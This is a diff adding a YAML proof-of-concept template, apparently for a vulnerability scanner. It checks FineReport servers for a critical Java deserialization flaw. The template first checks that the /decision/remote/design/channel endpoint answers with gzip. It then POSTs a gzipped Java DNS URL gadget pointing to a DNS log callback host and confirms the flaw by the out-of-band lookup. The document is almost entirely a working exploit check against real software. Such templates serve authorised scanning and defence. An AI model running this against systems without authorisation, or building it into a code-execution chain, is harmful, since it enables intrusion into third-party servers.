@@ -1,0 +1,25 @@
+id: poc-yaml-finereport-remote-channel-java-deserialization-2
+info:
+  name: FineReport remote/channel 反序列化漏洞 (DNSURL)
+  severity: critical
+  tags:
+  - DNSLOG
+  - 反序列化
+  finger: FineReport
+variables:
+  reverse: new_dns_log()
+  reverseUrl: reverse.Url()
+  javaPayload: java_dns_url_gadget(reverseUrl, "gzip")
+requests:
+- method: POST
+  path: /decision/remote/design/channel
+  expression: 'substr(body, 0, 3) == "\x1f\x8b\x08" && !contains(body, "</")
+
+    '
+- method: POST
+  path: /decision/remote/design/channel
+  data: '{{.javaPayload}}'
+  expression: 'substr(body, 0, 3) == "\x1f\x8b\x08" && reverse.Sleep(3)
+
+    '
+transport: http
